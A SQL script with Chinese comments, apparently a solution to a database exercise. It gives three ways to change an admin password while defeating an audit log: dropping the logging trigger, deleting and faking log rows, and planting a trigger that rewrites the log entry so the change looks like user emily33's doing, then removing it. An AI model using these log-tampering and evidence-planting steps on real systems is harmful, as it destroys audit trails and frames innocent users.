-- -- 方法一 暴力流
-- -- 1. 先刪掉 Trigger "log_user_updates"
-- DROP TRIGGER log_user_updates;

-- -- 2. 改掉 admin 密碼
-- UPDATE users SET password = '982c0381c279d139fd221fce974916e7'
-- WHERE users.username = 'admin';

-- -- 3. 檢查一下 log
-- SELECT * FROM user_logs;

-- -- 4. 自己插入一行 log 混淆
-- INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
-- VALUES ('update', 'admin', 'admin', 'e10adc3949ba59abbe56e057f20f883e', '44bf025d27eea66336e5c1133c3827f7');

-- -- 5. 檢查一下 log
-- SELECT * FROM user_logs;



-- -- 方法二 事後竄改
-- -- 1. 先直接改 admin 密碼
-- UPDATE users SET password = '982c0381c279d139fd221fce974916e7'
-- WHERE users.username = 'admin';

-- -- 2. 檢查一下 log
-- SELECT * FROM user_logs;

-- -- 3. 刪掉剛生成的 log
-- DELETE FROM user_logs
-- WHERE user_logs.old_password = 'e10adc3949ba59abbe56e057f20f883e';

-- -- 4. 檢查一下 log
-- SELECT * FROM user_logs;

-- -- 5. 插入假資料進 log
-- INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
-- VALUES ('update', 'admin', 'admin', 'e10adc3949ba59abbe56e057f20f883e', '44bf025d27eea66336e5c1133c3827f7');

-- -- 6. 檢查一下 log
-- SELECT * FROM user_logs;


-- 方法三 自己創一個 Trigger
-- 1. 製造假證據 hack trigger
CREATE TRIGGER hack
AFTER INSERT ON user_logs
FOR EACH ROW
WHEN NEW.new_password = '982c0381c279d139fd221fce974916e7'
BEGIN
    UPDATE user_logs
    SET new_password = (
        SELECT users.password FROM users
        WHERE users.username = 'emily33'
    )
    WHERE id = NEW.id;
END;

-- 2. 檢查一下 schema
-- .schema

-- 3. 更改 admin 密碼
UPDATE users SET password = '982c0381c279d139fd221fce974916e7'
WHERE users.username = 'admin';

-- 4. 檢查一下 log
SELECT * FROM user_logs;

-- 5. 抹除自創 trigger
DROP TRIGGER IF EXISTS hack;

-- 6. 檢查一下 shemea
-- .schema